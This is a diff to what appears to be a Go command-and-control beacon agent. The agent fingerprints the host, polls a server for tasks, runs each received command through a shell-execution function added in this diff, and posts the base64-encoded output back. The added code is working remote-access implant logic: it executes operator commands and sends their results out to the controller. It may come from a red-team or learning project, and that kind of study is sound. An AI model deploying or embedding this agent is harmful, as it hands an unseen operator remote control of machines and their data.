@@ -3,17 +3,30 @@ package main
 import (
 	"bytes"
 	"crypto/sha1"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"fmt"
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/denisbrodbeck/machineid"
 )
+
+type Result struct {
+	Command  string `json:"command"`
+	Beaconid string `json:"beacon_id"`
+	Type     string `json:"type"`
+	Input    string `json:"input"`
+	Taskid   string `json:"task_id"`
+	Output   string `json:"output"`
+}
 
 // Define Base URL
 var base_url = "http://localhost:5000/api/v1/ping"
@@ -44,7 +57,15 @@ func main() {
 }
 
 func exec_shell(input string) string {
-	return input
+	args := strings.Fields(input)
+	arguments := strings.Join(args[1:], " ")
+	output, err := exec.Command(args[0], arguments).Output()
+	if err != nil {
+		error := fmt.Sprint(err)
+		return string(error)
+	} else {
+		return string(output)
+	}
 }
 
 func generate_id() {
@@ -70,20 +91,37 @@ func beacon_data() []byte {
 	return json_content
 }
 
-func send_result(task_result string) {
-
+func send_result(task_result []byte) {
+	// Send core agent data to back-end API
+	response, response_error := http.Post(base_url, "application/json", bytes.NewBuffer(task_result))
+	if response_error != nil {
+		_ = response_error
+		_ = response
+	}
 }
 
-func execute_tasks(tasks_mapping []interface{}) {
-	// Foreach task execute command
-	for _, task := range tasks_mapping {
-		task_mapping := task.(map[string]interface{})
-		command := task_mapping["command"].(string)
-		command_input := task_mapping["input"].(string)
-		command_sleep := task_mapping["timer"].(float64)
-		command_result := function_mapping[command](command_input)
-		send_result(command_result)
-		time.Sleep(time.Duration(command_sleep) * time.Second)
+func execute_tasks(task_iod string, commands []interface{}) {
+	// Execute tasks in ordered list / synchronous
+	for _, commands := range commands {
+		command_mapping := commands.(map[string]interface{})
+		cmd_sleep := command_mapping["sleep"].(float64)
+		cmd_name := command_mapping["name"].(string)
+		cmd_input := command_mapping["input"].(string)
+		cmd_output := function_mapping[cmd_name](cmd_input)
+
+		result := &Result{
+			Taskid:   task_iod,
+			Type:     "manual",
+			Beaconid: beacon_id,
+			Command:  cmd_name,
+			Input:    cmd_input,
+			Output:   base64.StdEncoding.EncodeToString([]byte(cmd_output)),
+		}
+
+		time.Sleep(time.Duration(cmd_sleep) * time.Second)
+		json_object, _ := json.Marshal(result)
+		send_result(json_object)
+
 	}
 }
 
@@ -109,14 +147,16 @@ func send_pulse() interface{} {
 }
 
 func start_pulse() {
-	// Send pulse and map output to map object
+	// Send pulse and start threads to execute tasks
 	pulse_result := send_pulse()
-	pulse_mapping := pulse_result.(map[string]interface{})
-
-	// Get available tasks and map to interface slice
-	tasks_result := pulse_mapping["tasks"]
-	tasks_mapping := tasks_result.([]interface{})
-	execute_tasks(tasks_mapping)
+	task_list := pulse_result.([]interface{})
+	for _, task := range task_list {
+		task_mapping := task.(map[string]interface{})
+		task_id := task_mapping["_id"].(map[string]interface{})
+		task_iod := task_id["$oid"].(string)
+		commands := task_mapping["commands"].([]interface{})
+		go execute_tasks(task_iod, commands)
+	}
 
 }
 
